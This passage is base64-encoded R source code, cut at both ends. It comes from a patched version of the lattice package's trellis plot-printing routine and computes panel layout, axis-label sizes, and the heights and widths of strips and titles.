bVsyXS9kZGltWzFdDQogICAgICAgIHBhbmVsLmFzcGVjdCA8LSBwYW5lbC5o
ZWlnaHRbWzFdXS9wYW5lbC53aWR0aFtbMV1dDQogICAgICAgIHBsb3RzLnBl
ci5wYWdlIDwtIHgkbGF5b3V0WzJdDQogICAgICAgIG0gPC0gbWF4KDEsIHJv
dW5kKHNxcnQoeCRsYXlvdXRbMl0gKiBkZXZpY2UuYXNwZWN0L3BhbmVsLmFz
cGVjdCkpKQ0KICAgICAgICBuIDwtIGNlaWxpbmcocGxvdHMucGVyLnBhZ2Uv
bSkNCiAgICAgICAgbSA8LSBjZWlsaW5nKHBsb3RzLnBlci5wYWdlL24pDQog
ICAgICAgIHgkbGF5b3V0WzFdIDwtIG4NCiAgICAgICAgeCRsYXlvdXRbMl0g
PC0gbQ0KICAgIH0NCiAgICBlbHNlIHBsb3RzLnBlci5wYWdlIDwtIHgkbGF5
b3V0WzFdICogeCRsYXlvdXRbMl0NCiAgICBjb2xzLnBlci5wYWdlIDwtIHgk
bGF5b3V0WzFdDQogICAgcm93cy5wZXIucGFnZSA8LSB4JGxheW91dFsyXQ0K
ICAgIG51bWJlci5vZi5wYWdlcyA8LSB4JGxheW91dFszXQ0KICAgIGlmIChj
b2xzLnBlci5wYWdlID4gMSkgDQogICAgICAgIHguYmV0d2VlbiA8LSByZXAo
eCR4LmJldHdlZW4sIGxlbmd0aCA9IGNvbHMucGVyLnBhZ2UgLSANCiAgICAg
ICAgICAgIDEpDQogICAgaWYgKHJvd3MucGVyLnBhZ2UgPiAxKSANCiAgICAg
ICAgeS5iZXR3ZWVuIDwtIHJlcCh4JHkuYmV0d2VlbiwgbGVuZ3RoID0gcm93
cy5wZXIucGFnZSAtIA0KICAgICAgICAgICAgMSkNCiAgICB4LmFsdGVybmF0
aW5nIDwtIHJlcCh4JHguc2NhbGVzJGFsdGVybmF0aW5nLCBsZW5ndGggPSBj
b2xzLnBlci5wYWdlKQ0KICAgIHkuYWx0ZXJuYXRpbmcgPC0gcmVwKHgkeS5z
Y2FsZXMkYWx0ZXJuYXRpbmcsIGxlbmd0aCA9IHJvd3MucGVyLnBhZ2UpDQog
ICAgeC5yZWxhdGlvbi5zYW1lIDwtIHgkeC5zY2FsZXMkcmVsYXRpb24gPT0g
InNhbWUiDQogICAgeS5yZWxhdGlvbi5zYW1lIDwtIHgkeS5zY2FsZXMkcmVs
YXRpb24gPT0gInNhbWUiDQogICAgeGxvZyA8LSB4JHguc2NhbGVzJGxvZw0K
ICAgIHlsb2cgPC0geCR5LnNjYWxlcyRsb2cNCiAgICBpZiAoaXMubG9naWNh
bCh4bG9nKSAmJiB4bG9nKSANCiAgICAgICAgeGxvZyA8LSAxMA0KICAgIGlm
IChpcy5sb2dpY2FsKHlsb2cpICYmIHlsb2cpIA0KICAgICAgICB5bG9nIDwt
IDEwDQogICAgaGF2ZS54bG9nIDwtICFpcy5sb2dpY2FsKHhsb2cpIHx8IHhs
b2cNCiAgICBoYXZlLnlsb2cgPC0gIWlzLmxvZ2ljYWwoeWxvZykgfHwgeWxv
Zw0KICAgIHhsb2diYXNlIDwtIGlmIChpcy5udW1lcmljKHhsb2cpKSANCiAg
ICAgICAgeGxvZw0KICAgIGVsc2UgZXhwKDEpDQogICAgeWxvZ2Jhc2UgPC0g
aWYgKGlzLm51bWVyaWMoeWxvZykpIA0KICAgICAgICB5bG9nDQogICAgZWxz
ZSBleHAoMSkNCiAgICB4bG9ncGFzdGUgPC0gaWYgKGhhdmUueGxvZykgDQog
ICAgICAgIHBhc3RlKGFzLmNoYXJhY3Rlcih4bG9nKSwgIl4iLCBzZXAgPSAi
IikNCiAgICBlbHNlICIiDQogICAgeWxvZ3Bhc3RlIDwtIGlmIChoYXZlLnls
b2cpIA0KICAgICAgICBwYXN0ZShhcy5jaGFyYWN0ZXIoeWxvZyksICJeIiwg
c2VwID0gIiIpDQogICAgZWxzZSAiIg0KICAgIGhhdmUubWFpbiA8LSAhKGlz
Lm51bGwoeCRtYWluJGxhYmVsKSB8fCAoaXMuY2hhcmFjdGVyKHgkbWFpbiRs
YWJlbCkgJiYgDQogICAgICAgIHgkbWFpbiRsYWJlbCA9PSAiIikpDQogICAg
aGF2ZS5zdWIgPC0gIShpcy5udWxsKHgkc3ViJGxhYmVsKSB8fCAoaXMuY2hh
cmFjdGVyKHgkc3ViJGxhYmVsKSAmJiANCiAgICAgICAgeCRzdWIkbGFiZWwg
PT0gIiIpKQ0KICAgIGhhdmUueGxhYiA8LSAhKGlzLm51bGwoeCR4bGFiJGxh
YmVsKSB8fCAoaXMuY2hhcmFjdGVyKHgkeGxhYiRsYWJlbCkgJiYgDQogICAg
ICAgIHgkeGxhYiRsYWJlbCA9PSAiIikpDQogICAgaGF2ZS55bGFiIDwtICEo
aXMubnVsbCh4JHlsYWIkbGFiZWwpIHx8IChpcy5jaGFyYWN0ZXIoeCR5bGFi
JGxhYmVsKSAmJiANCiAgICAgICAgeCR5bGFiJGxhYmVsID09ICIiKSkNCiAg
ICBuLnJvdyA8LSByb3dzLnBlci5wYWdlICogKG51bWJlci5vZi5jb25kICsg
MykgKyAocm93cy5wZXIucGFnZSAtIA0KICAgICAgICAxKSArIDExDQogICAg
bi5jb2wgPC0gMyAqIGNvbHMucGVyLnBhZ2UgKyAoY29scy5wZXIucGFnZSAt
IDEpICsgOQ0KICAgIGlmIChsYXlvdXQucmVzcGVjdCkgew0KICAgICAgICBs
YXlvdXQucmVzcGVjdCA8LSBtYXRyaXgoMCwgbi5yb3csIG4uY29sKQ0KICAg
ICAgICBsYXlvdXQucmVzcGVjdFtudW1iZXIub2YuY29uZCArIDYgKyAoMTpy
b3dzLnBlci5wYWdlIC0gDQogICAgICAgICAgICAxKSAqIChudW1iZXIub2Yu
Y29uZCArIDQpLCAoMTpjb2xzLnBlci5wYWdlIC0gMSkgKiANCiAgICAgICAg
ICAgIDQgKyA4XSA8LSAxDQogICAgfQ0KICAgIGhlaWdodHMueCA8LSByZXAo
MSwgbi5yb3cpDQogICAgaGVpZ2h0cy51bml0cyA8LSByZXAoImxpbmVzIiwg
bi5yb3cpDQogICAgaGVpZ2h0cy5kYXRhIDwtIGFzLmxpc3QoMTpuLnJvdykN
CiAgICB3aWR0aHMueCA8LSByZXAoMSwgbi5jb2wpDQogICAgd2lkdGhzLnVu
aXRzIDwtIHJlcCgibGluZXMiLCBuLmNvbCkNCiAgICB3aWR0aHMuZGF0YSA8
LSBhcy5saXN0KDE6bi5jb2wpDQogICAgaGVpZ2h0cy54W251bWJlci5vZi5j
b25kICsgNiArICgxOnJvd3MucGVyLnBhZ2UgLSAxKSAqIChudW1iZXIub2Yu
Y29uZCArIA0KICAgICAgICA0KV0gPC0gcGFuZWwuaGVpZ2h0W1sxXV0NCiAg
ICBoZWlnaHRzLnVuaXRzW251bWJlci5vZi5jb25kICsgNiArICgxOnJvd3Mu
cGVyLnBhZ2UgLSAxKSAqIA0KICAgICAgICAobnVtYmVyLm9mLmNvbmQgKyA0
KV0gPC0gcGFuZWwuaGVpZ2h0W1syXV0NCiAgICBoZWlnaHRzLnhbbnVtYmVy
Lm9mLmNvbmQgKyA3ICsgKDE6cm93cy5wZXIucGFnZSAtIDEpICogKG51bWJl
ci5vZi5jb25kICsgDQogICAgICAgIDQpXSA8LSAwDQogICAgaGVpZ2h0cy54
W251bWJlci5vZi5jb25kICsgOCArICgxOnJvd3MucGVyLnBhZ2UgLSAxKSAq
IChudW1iZXIub2YuY29uZCArIA0KICAgICAgICA0KV0gPC0gMA0KICAgIGhl
aWdodHMueFs0XSA8LSAwDQogICAgaGVpZ2h0cy54WzVdIDwtIDANCiAgICBo
ZWlnaHRzLnhbbi5yb3cgLSA0XSA8LSAwDQogICAgaGVpZ2h0cy54W24ucm93
IC0gNV0gPC0gMA0KICAgIGlmIChyb3dzLnBlci5wYWdlID4gMSkgDQogICAg
ICAgIGhlaWdodHMueFtudW1iZXIub2YuY29uZCArIDkgKyAoKGlmICh4JGFz
LnRhYmxlKSANCiAgICAgICAgICAgIDE6KHJvd3MucGVyLnBhZ2UgLSAxKQ0K
ICAgICAgICBlbHNlIChyb3dzLnBlci5wYWdlIC0gMSk6MSkgLSAxKSAqIChu
dW1iZXIub2YuY29uZCArIA0KICAgICAgICAgICAgNCldIDwtIHkuYmV0d2Vl
bg0KICAgIGhlaWdodHMueFsxXSA8LSAwLjUNCiAgICBoZWlnaHRzLnhbMl0g
PC0gaWYgKGhhdmUubWFpbikgDQogICAgICAgIDIgKiB4JG1haW4kY2V4DQog
ICAgZWxzZSAwDQogICAgaWYgKGhhdmUubWFpbikgew0KICAgICAgICBoZWln
aHRzLnVuaXRzWzJdIDwtICJzdHJoZWlnaHQiDQogICAgICAgIGhlaWdodHMu
ZGF0YVtbMl1dIDwtIHgkbWFpbiRsYWINCiAgICB9DQogICAgaGVpZ2h0cy54
W24ucm93XSA8LSAwLjUNCiAgICBoZWlnaHRzLnhbbi5yb3cgLSAxXSA8LSBp
ZiAoaGF2ZS5zdWIpIA0KICAgICAgICAyICogeCRzdWIkY2V4DQogICAgZWxz
ZSAwDQogICAgaWYgKGhhdmUuc3ViKSB7DQogICAgICAgIGhlaWdodHMudW5p
dHNbbi5yb3cgLSAxXSA8LSAic3RyaGVpZ2h0Ig0KICAgICAgICBoZWlnaHRz
LmRhdGFbW24ucm93IC0gMV1dIDwtIHgkc3ViJGxhYg0KICAgIH0NCiAgICBo
ZWlnaHRzLnhbM10gPC0gMA0KICAgIGhlaWdodHMueFtuLnJvdyAtIDJdIDwt
IDANCiAgICBoZWlnaHRzLmluc2VydGxpc3QucG9zaXRpb24gPC0gMA0KICAg
IGhlaWdodHMuaW5zZXJ0bGlzdC51bml0IDwtIHVuaXQoMSwgIm51bGwiKQ0K
ICAgIGlmICh4JHguc2NhbGVzJGRyYXcpIHsNCiAgICAgICAgaWYgKHgucmVs
YXRpb24uc2FtZSkgew0KICAgICAgICAgICAgbGFiIDwtIGNhbGN1bGF0ZUF4
aXNDb21wb25lbnRzKHggPSB4JHgubGltaXRzLCBhdCA9IHgkeC5zY2FsZXMk
YXQsIA0KICAgICAgICAgICAgICAgIGxhYmVscyA9IHgkeC5zY2FsZXMkbGFi
LCBoYXZlLmxvZyA9IGhhdmUueGxvZywgDQogICAgICAgICAgICAgICAgbG9n
YmFzZSA9IHhsb2diYXNlLCBsb2dwYXN0ZSA9IHhsb2dwYXN0ZSwgYWJicmV2
aWF0ZSA9IHgkeC5zY2FsZXMkYWJiciwgDQogICAgICAgICAgICAgICAgbWlu
bGVuZ3RoID0geCR4LnNjYWxlcyRtaW5sLCBuID0geCR4LnNjYWxlcyR0aWNr
Lm51bWJlcikkbGFiDQojIyAgICAgICAgICBpZiAoaXMuY2hhcmFjdGVyKGxh
YikpIA0KICAgICAgICAgICAgaWYgKGFsbChzYXBwbHkobGFiLCBpcy5jaGFy
YWN0ZXIpKSkgICMjIHJtaA0KICAgICAgICAgICAgICAgIHN0cmJhciA8LSBh
cy5saXN0KGxhYikNCiAgICAgICAgICAgIGVsc2UgaWYgKGlzLmV4cHJlc3Np
b24obGFiKSkgew0KICAgICAgICAgICAgICAgIHN0cmJhciA8LSBsaXN0KCkN
CiAgICAgICAgICAgICAgICBmb3IgKHNzIGluIHNlcShhbG9uZyA9IGxhYikp
IHN0cmJhciA8LSBjKHN0cmJhciwgDQogICAgICAgICAgICAgICAgICBsaXN0
KGxhYltzc10pKQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBz
dG9wKCJJbnZhbGlkIHZhbHVlIGZvciBsYWJlbHMiKQ0KICAgICAgICAgICAg
aGVpZ2h0cy54WzVdIDwtIDAuNSArIG1heCgwLjAwMSwgeCR4LnNjYWxlcyR0
Y2tbMl0pICogDQogICAgICAgICAgICAgICAgMC4zDQogICAgICAgICAgICBo
ZWlnaHRzLnhbbi5yb3cgLSA1XSA8LSAwLjUgKyBtYXgoMC4wMDEsIHgkeC5z
Y2FsZXMkdGNrWzFdKSAqIA0KICAgICAgICAgICAgICAgIDAuMw0KICAgICAg
ICAgICAgaWYgKGFueSh4LmFsdGVybmF0aW5nID09IDIgfCB4LmFsdGVybmF0
aW5nID09IDMpKSB7DQogICAgICAgICAgICAgICAgaWYgKHhheGlzLnJvdFsy
XSAlaW4lIGMoMCwgMTgwKSkgew0KICAgICAgICAgICAgICAgICAgaGVpZ2h0
cy5pbnNlcnRsaXN0LnBvc2l0aW9uIDwtIGMoaGVpZ2h0cy5pbnNlcnRsaXN0
LnBvc2l0aW9uLCANCiAgICAgICAgICAgICAgICAgICAgNCkNCiAgICAgICAg
ICAgICAgICAgIGhlaWdodHMuaW5zZXJ0bGlzdC51bml0IDwtIHVuaXQuYyho
ZWlnaHRzLmluc2VydGxpc3QudW5pdCwgDQogICAgICAgICAgICAgICAgICAg
IG1heCh1bml0KHJlcCgxICogeGF4aXMuY2V4WzJdLCBsZW5ndGgoc3RyYmFy
KSksIA0KICAgICAgICAgICAgICAgICAgICAgICJzdHJoZWlnaHQiLCBzdHJi
YXIpKSkNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxz
ZSB7DQogICAgICAgICAgICAgICAgICBoZWlnaHRzLmluc2VydGxpc3QucG9z
aXRpb24gPC0gYyhoZWlnaHRzLmluc2VydGxpc3QucG9zaXRpb24sIA0KICAg
ICAgICAgICAgICAgICAgICA0KQ0KICAgICAgICAgICAgICAgICAgaGVpZ2h0
cy5pbnNlcnRsaXN0LnVuaXQgPC0gdW5pdC5jKGhlaWdodHMuaW5zZXJ0bGlz
dC51bml0LCANCiAgICAgICAgICAgICAgICAgICAgbWF4KHVuaXQocmVwKDEg
KiB4YXhpcy5jZXhbMl0gKiBhYnMoc2luKHhheGlzLnJvdFsyXSAqIA0KICAg
ICAgICAgICAgICAgICAgICAgIGJhc2U6OnBpLzE4MCkpLCBsZW5ndGgoc3Ry
YmFyKSksICJzdHJ3aWR0aCIsIA0KICAgICAgICAgICAgICAgICAgICAgIHN0
cmJhcikpKQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAg
ICAgICAgICAgIGlmIChhbnkoeC5hbHRlcm5hdGluZyA9PSAxIHwgeC5hbHRl
cm5hdGluZyA9PSAzKSkgew0KICAgICAgICAgICAgICAgIGlmICh4YXhpcy5y
b3RbMV0gJWluJSBjKDAsIDE4MCkpIHsNCiAgICAgICAgICAgICAgICAgIGhl
aWdodHMuaW5zZXJ0bGlzdC5wb3NpdGlvbiA8LSBjKGhlaWdodHMuaW5zZXJ0
bGlzdC5wb3NpdGlvbiwgDQogICAgICAgICAgICAgICAgICAgIG4ucm93IC0g
NCkNCiAgICAgICAgICAgICAgICAgIGhlaWdodHMuaW5zZXJ0bGlzdC51bml0
IDwtIHVuaXQuYyhoZWlnaHRzLmluc2VydGxpc3QudW5pdCwgDQogICAgICAg
ICAgICAgICAgICAgIG1heCh1bml0KHJlcCgxICogeGF4aXMuY2V4WzFdLCBs
ZW5ndGgoc3RyYmFyKSksIA0KICAgICAgICAgICAgICAgICAgICAgICJzdHJo
ZWlnaHQiLCBzdHJiYXIpKSkNCiAgICAgICAgICAgICAgICB9DQogICAgICAg
ICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICBoZWlnaHRzLmlu
c2VydGxpc3QucG9zaXRpb24gPC0gYyhoZWlnaHRzLmluc2VydGxpc3QucG9z
aXRpb24sIA0KICAgICAgICAgICAgICAgICAgICBuLnJvdyAtIDQpDQogICAg
ICAgICAgICAgICAgICBoZWlnaHRzLmluc2VydGxpc3QudW5pdCA8LSB1bml0
LmMoaGVpZ2h0cy5pbnNlcnRsaXN0LnVuaXQsIA0KICAgICAgICAgICAgICAg
ICAgICBtYXgodW5pdChyZXAoMSAqIHhheGlzLmNleFsxXSAqIGFicyhzaW4o
eGF4aXMucm90WzFdICogDQogICAgICAgICAgICAgICAgICAgICAgYmFzZTo6
cGkvMTgwKSksIGxlbmd0aChzdHJiYXIpKSwgInN0cndpZHRoIiwgDQogICAg
ICAgICAgICAgICAgICAgICAgc3RyYmFyKSkpDQogICAgICAgICAgICAgICAg
fQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0K
ICAgICAgICAgICAgbGFiZWxDaGFycyA8LSBjaGFyYWN0ZXIoMCkNCiAgICAg
ICAgICAgIGxhYmVsRXhwcnMgPC0gZXhwcmVzc2lvbigwKQ0KICAgICAgICAg
ICAgZm9yIChpIGluIHNlcShhbG9uZyA9IHgkeC5saW1pdHMpKSB7DQogICAg
ICAgICAgICAgICAgbGFiIDwtIGNhbGN1bGF0ZUF4aXNDb21wb25lbnRzKHgg
PSB4JHgubGltaXRzW1tpXV0sIA0KICAgICAgICAgICAgICAgICAgYXQgPSBp
ZiAoaXMubGlzdCh4JHguc2NhbGVzJGF0KSkgDQogICAgICAgICAgICAgICAg
ICAgIHgkeC5zY2FsZXMkYXRbW2ldXQ0KICAgICAgICAgICAgICAgICAgZWxz
ZSB4JHguc2NhbGVzJGF0LCBsYWJlbHMgPSBpZiAoaXMubGlzdCh4JHguc2Nh
bGVzJGxhYikpIA0KICAgICAgICAgICAgICAgICAgICB4JHguc2NhbGVzJGxh
YltbaV1dDQogICAgICAgICAgICAgICAgICBlbHNlIHgkeC5zY2FsZXMkbGFi
LCBoYXZlLmxvZyA9IGhhdmUueGxvZywgDQogICAgICAgICAgICAgICAgICBs
b2diYXNlID0geGxvZ2Jhc2UsIGxvZ3Bhc3RlID0geGxvZ3Bhc3RlLCBhYmJy
ZXZpYXRlID0geCR4LnNjYWxlcyRhYmJyLCANCiAgICAgICAgICAgICAgICAg
IG1pbmxlbmd0aCA9IHgkeC5zY2FsZXMkbWlubCwgbiA9IHgkeC5zY2FsZXMk
dGljay5udW1iZXIpJGxhYg0KICAgICAgICAgICAgICAgIGlmIChpcy5jaGFy
YWN0ZXIobGFiKSkgDQogICAgICAgICAgICAgICAgICBsYWJlbENoYXJzIDwt
IGMobGFiZWxDaGFycywgbGFiKQ0KICAgICAgICAgICAgICAgIGVsc2UgaWYg
KGlzLmV4cHJlc3Npb24obGFiKSkgDQogICAgICAgICAgICAgICAgICBsYWJl
bEV4cHJzIDwtIGMobGFiZWxFeHBycywgbGFiKQ0KICAgICAgICAgICAgfQ0K
ICAgICAgICAgICAgbGFiZWxDaGFycyA8LSB1bmlxdWUobGFiZWxDaGFycykN
CiAgICAgICAgICAgIHN0cmJhciA8LSBsaXN0KCkNCiAgICAgICAgICAgIGZv
ciAoc3MgaW4gbGFiZWxDaGFycykgc3RyYmFyIDwtIGMoc3RyYmFyLCBsaXN0
KHNzKSkNCiAgICAgICAgICAgIGZvciAoc3MgaW4gc2VxKGFsb25nID0gbGFi
ZWxFeHBycykpIHN0cmJhciA8LSBjKHN0cmJhciwgDQogICAgICAgICAgICAg
ICAgbGlzdChsYWJlbEV4cHJzW3NzXSkpDQogICAgICAgICAgICBpZiAoeGF4
aXMucm90WzFdICVpbiUgYygwLCAxODApKSB7DQogICAgICAgICAgICAgICAg
aGVpZ2h0cy54W251bWJlci5vZi5jb25kICsgNyArICgxOnJvd3MucGVyLnBh
Z2UgLSANCiAgICAgICAgICAgICAgICAgIDEpICogKG51bWJlci5vZi5jb25k
ICsgNCldIDwtIG1heCgwLjAwMSwgeCR4LnNjYWxlcyR0Y2tbMV0pICogDQog
ICAgICAgICAgICAgICAgICAwLjMNCiAgICAgICAgICAgICAgICBoZWlnaHRz
Lmluc2VydGxpc3QucG9zaXRpb24gPC0gYyhoZWlnaHRzLmluc2VydGxpc3Qu
cG9zaXRpb24sIA0KICAgICAgICAgICAgICAgICAgbnVtYmVyLm9mLmNvbmQg
KyA4ICsgKDE6cm93cy5wZXIucGFnZSAtIDEpICogDQogICAgICAgICAgICAg
ICAgICAgIChudW1iZXIub2YuY29uZCArIDQpKQ0KICAgICAgICAgICAgICAg
IGZvciAoaSBpbiAxOnJvd3MucGVyLnBhZ2UpIGhlaWdodHMuaW5zZXJ0bGlz
dC51bml0IDwtIHVuaXQuYyhoZWlnaHRzLmluc2VydGxpc3QudW5pdCwgDQog
ICAgICAgICAgICAgICAgICBtYXgodW5pdChyZXAoMS41ICogeGF4aXMuY2V4
WzFdLCBsZW5ndGgoc3RyYmFyKSksIA0KICAgICAgICAgICAgICAgICAgICAi
c3RyaGVpZ2h0Iiwgc3RyYmFyKSkpDQogICAgICAgICAgICB9DQogICAgICAg
ICAgICBlbHNlIHsNCiAgICAgICAgICAgICAgICBoZWlnaHRzLnhbbnVtYmVy
Lm9mLmNvbmQgKyA3ICsgKDE6cm93cy5wZXIucGFnZSAtIA0KICAgICAgICAg
ICAgICAgICAgMSkgKiAobnVtYmVyLm9mLmNvbmQgKyA0KV0gPC0gbWF4KDAu
MDAxLCB4JHguc2NhbGVzJHRja1sxXSkgKiANCiAgICAgICAgICAgICAgICAg
IDAuMw0KICAgICAgICAgICAgICAgIGhlaWdodHMuaW5zZXJ0bGlzdC5wb3Np
dGlvbiA8LSBjKGhlaWdodHMuaW5zZXJ0bGlzdC5wb3NpdGlvbiwgDQogICAg
ICAgICAgICAgICAgICBudW1iZXIub2YuY29uZCArIDggKyAoMTpyb3dzLnBl
ci5wYWdlIC0gMSkgKiANCiAgICAgICAgICAgICAgICAgICAgKG51bWJlci5v
Zi5jb25kICsgNCkpDQogICAgICAgICAgICAgICAgZm9yIChpIGluIDE6cm93
cy5wZXIucGFnZSkgaGVpZ2h0cy5pbnNlcnRsaXN0LnVuaXQgPC0gdW5pdC5j
KGhlaWdodHMuaW5zZXJ0bGlzdC51bml0LCANCiAgICAgICAgICAgICAgICAg
IG1heCh1bml0KHJlcCgxLjUgKiB4YXhpcy5jZXhbMV0gKiBhYnMoc2luKHhh
eGlzLnJvdFsxXSAqIA0KICAgICAgICAgICAgICAgICAgICBiYXNlOjpwaS8x
ODApKSwgbGVuZ3RoKHN0cmJhcikpLCAic3Ryd2lkdGgiLCANCiAgICAgICAg
ICAgICAgICAgICAgc3RyYmFyKSkpDQogICAgICAgICAgICB9DQogICAgICAg
IH0NCiAgICB9DQogICAgaGVpZ2h0cy54W24ucm93IC0gM10gPC0gaWYgKGhh
dmUueGxhYikgDQogICAgICAgIDIgKiB4JHhsYWIkY2V4DQogICAgZWxzZSAw
DQogICAgaWYgKGhhdmUueGxhYikgew0KICAgICAgICBoZWlnaHRzLnVuaXRz
W24ucm93IC0gM10gPC0gInN0cmhlaWdodCINCiAgICAgICAgaGVpZ2h0cy5k
YXRhW1tuLnJvdyAtIDNdXSA8LSB4JHhsYWIkbGFiDQogICAgfQ0KICAgIGZv
ciAoY3JyIGluIDE6bnVtYmVyLm9mLmNvbmQpIGhlaWdodHMueFtudW1iZXIu
b2YuY29uZCArIA0KICAgICAgICA2ICsgKDE6cm93cy5wZXIucGFnZSAtIDEp
ICogKG51bWJlci5vZi5jb25kICsgNCkgLSBjcnJdIDwtIGlmIChpcy5sb2dp
Y2FsKHgkc3RyaXApKSANCiAgICAgICAgMA0KICAgIGVsc2UgMS4xICogeCRw
YXIuc3RyaXAudGV4dCRjZXggKiB4JHBhci5zdHJpcC50ZXh0JGxpbmVzDQog
ICAgd2lkdGhzLnhbM10gPC0gaWYgKGhhdmUueWxhYikgDQogICAgICAgIDIg
KiB4JHlsYWIkY2V4DQogICAgZWxzZSAwDQogICAgaWYgKGhhdmUueWxhYikg
ew0KICAgICAgICB3aWR0aHMudW5pdHNbM10gPC0gInN0cmhlaWdodCINCiAg
ICAgICAgd2lkdGhzLmRhdGFbWzNdXSA8LSB4JHlsYWIkbGFiDQogICAgfQ0K
ICAgIHdpZHRocy54WygxOmNvbHMucGVyLnBhZ2UgLSAxKSAqIDQgKyA4XSA8
LSBwYW5lbC53aWR0aFtbMV1dDQogICAgd2lkdGhzLnVuaXRzWygxOmNvbHMu
cGVyLnBhZ2UgLSAxKSAqIDQgKyA4XSA8LSBwYW5lbC53aWR0aFtbMl1dDQog
ICAgd2lkdGhzLnhbKDE6Y29scy5wZXIucGFnZSAtIDEpICogNCArIDddIDwt
IDANCiAgICB3aWR0aHMueFsoMTpjb2xzLnBlci5wYWdlIC0gMSkgKiA0ICsg
Nl0gPC0gMA0KICAgIHdpZHRocy54WzRdIDwtIDANCiAgICB3aWR0aHMueFs1
XSA8LSAwDQogICAgd2lkdGhzLnhbbi5jb2wgLSAyXSA8LSAwDQogICAgd2lk
dGhzLnhbbi5jb2wgLSAzXSA8LSAwDQogICAgaWYgKGNvbHMucGVyLnBhZ2Ug
PiAxKSANCiAgICAgICAgd2lkdGhzLnhbKDE6KGNvbHMucGVyLnBhZ2UgLSAx
KSAtIDEpICogNCArIDldIDwtIHguYmV0d2Vlbg0KICAgIHdpZHRocy54WzFd
IDwtIDAuNQ0KICAgIHdpZHRocy54W24uY29sXSA8LSAwLjUNCiAgICB3aWR0
aHMueFsyXSA8LSAwDQogICAgd2lkdGhzLnhbbi5jb2wgLSAxXSA8LSAwDQog
ICAgd2lkdGhzLmluc2VydGxpc3QucG9zaXRpb24gPC0gMA0KICAgIHdpZHRo
cy5pbnNlcnRsaXN0LnVuaXQgPC0gdW5pdCgxLCAibnVsbCIpDQogICAgaWYg
KHgkeS5zY2FsZXMkZHJhdykgew0KICAgICAgICBpZiAoeS5yZWxhdGlvbi5z
YW1lKSB7DQogICAgICAgICAgICBsYWIgPC0gY2FsY3VsYXRlQXhpc0NvbXBv
bmVudHMoeCA9IHgkeS5saW1pdHMsIGF0ID0geCR5LnNjYWxlcyRhdCwgDQog
ICAgICAgICAgICAgICAgbGFiZWxzID0geCR5LnNjYWxlcyRsYWIsIGhhdmUu
bG9nID0gaGF2ZS55bG9nLCANCiAgICAgICAgICAgICAgICBsb2diYXNlID0g
eWxvZ2Jhc2UsIGxvZ3Bhc3RlID0geWxvZ3Bhc3RlLCBhYmJyZXZpYXRlID0g
eCR5LnNjYWxlcyRhYmJyLCANCiAgICAgICAgICAgICAgICBtaW5sZW5ndGgg
PSB4JHkuc2NhbGVzJG1pbmwsIG4gPSB4JHkuc2NhbGVzJHRpY2subnVtYmVy
KSRsYWINCiMjICAgICAgICAgIGlmIChpcy5jaGFyYWN0ZXIobGFiKSkgDQog
ICAgICAgICAgICBpZiAoYWxsKHNhcHBseShsYWIsIGlzLmNoYXJhY3Rlcikp
KSAgIyMgcm1oDQogICAgICAgICAgICAgICAgc3RyYmFyIDwtIGFzLmxpc3Qo
bGFiKQ0KICAgICAgICAgICAgZWxzZSBpZiAoaXMuZXhwcmVzc2lvbihsYWIp
KSB7DQogICAgICAgICAgICAgICAgc3RyYmFyIDwtIGxpc3QoKQ0KICAgICAg
ICAgICAgICAgIGZvciAoc3MgaW4gc2VxKGFsb25nID0gbGFiKSkgc3RyYmFy
IDwtIGMoc3RyYmFyLCANCiAgICAgICAgICAgICAgICAgIGxpc3QobGFiW3Nz
XSkpDQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIHN0b3AoIklu
dmFsaWQgdmFsdWUgZm9yIGxhYmVscyIpDQogICAgICAgICAgICB3aWR0aHMu
eFs1XSA8LSAwLjUgKyBtYXgoMC4wMDEsIHgkeS5zY2FsZXMkdGNrWzFdKSAq
IA0KICAgICAgICAgICAgICAgIDAuMw0KICAgICAgICAgICAgd2lkdGhzLnhb
bi5jb2wgLSAzXSA8LSBtYXgoMSwgeCR5LnNjYWxlcyR0Y2tbMl0pICogDQog
ICAgICAgICAgICAgICAgMC41DQogICAgICAgICAgICBpZiAoYW55KHkuYWx0
ZXJuYXRpbmcgPT0gMSB8IHkuYWx0ZXJuYXRpbmcgPT0gMykpIHsNCiAgICAg
ICAgICAgICAgICBpZiAoYWJzKHlheGlzLnJvdFsxXSkgPT0gOTApIHsNCiAg
ICAgICAgICAgICAgICAgIHdpZHRocy5pbnNlcnRsaXN0LnBvc2l0aW9uIDwt
IGMod2lkdGhzLmluc2VydGxpc3QucG9zaXRpb24sIA0KICAgICAgICAgICAg
ICAgICAgICA0KQ0KICAgICAgICAgICAgICAgICAgd2lkdGhzLmluc2VydGxp
c3QudW5pdCA8LSB1bml0LmMod2lkdGhzLmluc2VydGxpc3QudW5pdCwgDQog
ICAgICAgICAgICAgICAgICAgIG1heCh1bml0KDEgKiByZXAoeWF4aXMuY2V4
WzFdLCBsZW5ndGgoc3RyYmFyKSksIA0KICAgICAgICAgICAgICAgICAgICAg
ICJzdHJoZWlnaHQiLCBkYXRhID0gc3RyYmFyKSkpDQogICAgICAgICAgICAg
ICAgfQ0KICAgICAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAg
ICAgd2lkdGhzLmluc2VydGxpc3QucG9zaXRpb24gPC0gYyh3aWR0aHMuaW5z
ZXJ0bGlzdC5wb3NpdGlvbiwgDQogICAgICAgICAgICAgICAgICAgIDQpDQog
ICAgICAgICAgICAgICAgICB3aWR0aHMuaW5zZXJ0bGlzdC51bml0IDwtIHVu
aXQuYyh3aWR0aHMuaW5zZXJ0bGlzdC51bml0LCANCiAgICAgICAgICAgICAg
ICAgICAgbWF4KHVuaXQocmVwKDEgKiB5YXhpcy5jZXhbMV0gKiBhYnMoY29z
KHlheGlzLnJvdFsxXSAqIA0KICAgICAgICAgICAgICAgICAgICAgIGJhc2U6
OnBpLzE4MCkpLCBsZW5ndGgoc3RyYmFyKSksICJzdHJ3aWR0aCIsIA0KICAg
ICAgICAgICAgICAgICAgICAgIHN0cmJhcikpKQ0KICAgICAgICAgICAgICAg
IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChhbnkoeS5hbHRl
